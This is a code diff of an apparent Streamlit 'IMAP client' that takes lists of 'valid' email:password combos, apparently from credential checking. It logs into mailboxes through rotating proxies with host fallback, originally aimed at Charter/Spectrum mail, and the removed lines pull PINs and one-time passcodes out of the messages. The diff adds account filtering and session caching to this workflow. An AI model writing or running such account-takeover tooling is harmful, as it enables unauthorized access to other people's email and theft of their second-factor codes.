-st.caption("Advanced IMAP Client with Proxy Integration & Robust SSL Wrapping for Charter/Spectrum/Mobile.charter.net")
+st.caption("Advanced IMAP Client with Interactive Bot Intelligence & Robust Proxy/Host Fallback Integration.")
 
 valid = load_valid()
-clean_valid_accounts = [l for l in valid if not l.startswith("# Found:")]
+account_filter_query = st.text_input("🔍 Filter Valid Accounts", placeholder="Type email, domain, or timestamp...").strip().lower()
+valid_dropdown_options = [x for x in valid if not account_filter_query or account_filter_query in x.lower()] or ["none"]
 
-pick = st.selectbox("Valid account", clean_valid_accounts if clean_valid_accounts else ["none"])
-override = st.sidebar.text_input("IMAP host override", placeholder="mobile.charter.net")
+pick = st.selectbox("Valid account", valid_dropdown_options, index=0, key="selected_account")
+actual_pick = pick.strip() if pick and pick != "none" and not pick.startswith("# Found:") else "none"
 
-active_email, active_password = "", ""
-if pick and pick != "none" and ":" in pick:
-    active_email, active_password = pick.split(":", 1)
+if actual_pick != "none" and ":" in actual_pick:
+    save_last_account(actual_pick)
 
-if st.sidebar.button("🔄 Refresh Inbox & Discover Folders", type="primary", use_container_width=True):
-    if not active_email or not active_password:
-        st.sidebar.error("Select a valid account first.")
+st.sidebar.header("Account & Connection Hub")
+override = st.sidebar.text_input("IMAP host override", key="custom_host")
+
+active_email, active_password = (actual_pick.split(":", 1) if ":" in actual_pick else ("", ""))
+
+if st.sidebar.button("Connect & Discover Folders", type="primary", use_container_width=True):
+    if actual_pick == "none" or ":" not in actual_pick:
+        st.error("Please select a valid account.")
     else:
         hosts = get_verified_hosts_for_email(active_email, custom_override=override)
-        success, connected_host, folders = False, "", ["INBOX"]
-        test_mail = None
-        with st.spinner(f"Connecting via robust proxy & SSL context to {hosts[0]}..."):
-            for h in hosts:
-                try:
-                    proxy_pool = load_proxies()
-                    p_str = proxy_pool[0] if proxy_pool else None
-                    test_mail = open_imap(h, 993, 15, proxy_str=p_str)
-                    test_mail.login(active_email, active_password)
-                    folders = list_folders(test_mail, active_email, h)
-                    connected_host = h
-                    success = True
-                    break
-                except Exception as ex:
-                    if test_mail:
-                        try: test_mail.logout()
-                        except Exception: pass
+        success, connected_host, discovered_folders, test_mail = False, "", ["INBOX"], None
+        
+        for host in hosts:
+            try:
+                proxies = load_app_proxies()
+                proxy_str = proxies[0] if proxies else None
+                test_mail = open_imap(host, 993, 15, proxy_str=proxy_str)
+                test_mail.login(active_email, active_password)
+                discovered_folders = list_folders(test_mail, email_addr=active_email, host_val=host)
+                connected_host = host
+                success = True
+                break
+            except Exception:
+                if test_mail:
+                    try: test_mail.logout()
+                    except Exception: pass
+        
         if success:
+            combo = f"{active_email}:{active_password}"
             st.session_state.active_mail = test_mail
-            st.session_state.connected_account_combo = f"{active_email}:{active_password}"
+            st.session_state.connected_account_combo = combo
             st.session_state.mb_host = connected_host
-            st.session_state.mb_folders = folders
-            st.sidebar.success(f"Connected: {connected_host} ({len(folders)} folders)")
+            st.session_state.mb_folders = discovered_folders
+            save_session_cache()
+            st.success(f"Connected: {connected_host} ({len(discovered_folders)} folders)")
             st.rerun()
         else:
-            st.sidebar.error("❌ Connection failed. Check network or proxy settings.")
+            st.error("Connection failed across all verified host candidates.")
 
 folder = st.selectbox("Select Mail Folder", st.session_state.mb_folders)
 if st.button("📂 Load Folder Messages", type="primary", use_container_width=True):
-    if not active_email or not active_password:
-        st.error("Connect to an account first.")
+    default_hosts = get_verified_hosts_for_email(active_email, custom_override=override)
+    host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
+    if not active_email or not active_password or not host:
+        st.error("Please connect and load folders first.")
     else:
         try:
-            with st.spinner(f"Loading messages from '{folder}'..."):
-                mail = get_active_mail(active_email, active_password, st.session_state.mb_host or "mobile.charter.net")
-                st.session_state.current_messages = fetch_messages_paginated(mail, active_email, active_password, st.session_state.mb_host, [folder])
+            with st.spinner(f"Loading folder '{folder}'..."):
+                mail = get_active_mail(active_email, active_password, host)
+                st.session_state.current_messages = fetch_messages_paginated(
+                    mail, active_email, active_password, host, [folder], mode="FOLDER_ONLY", 
+                    page_size=15, page_number=1, sort_order="Newest First"
+                )
+                save_session_cache()
                 st.success(f"Loaded {len(st.session_state.current_messages)} messages.")
+                st.rerun()
         except Exception as e:
-            st.error(f"Error loading messages: {e}")
-
-if st.session_state.current_messages:
-    st.markdown("---")
-    for idx, msg in enumerate(st.session_state.current_messages):
-        with st.expander(f"[{msg['folder']}] {msg['date']} | {msg['from']} — {msg['subject']}", expanded=False):
-            st.write(f"**From:** {msg['from']} | **To:** {msg['to']}")
-            if msg["pins"]:
-                st.success(f"🔑 **PINs / OTP:** {', '.join(msg['pins'])}")
-            st.text_area("Body", value=msg["body"], height=120, key=f"body_{idx}")
+            st.error(str(e))
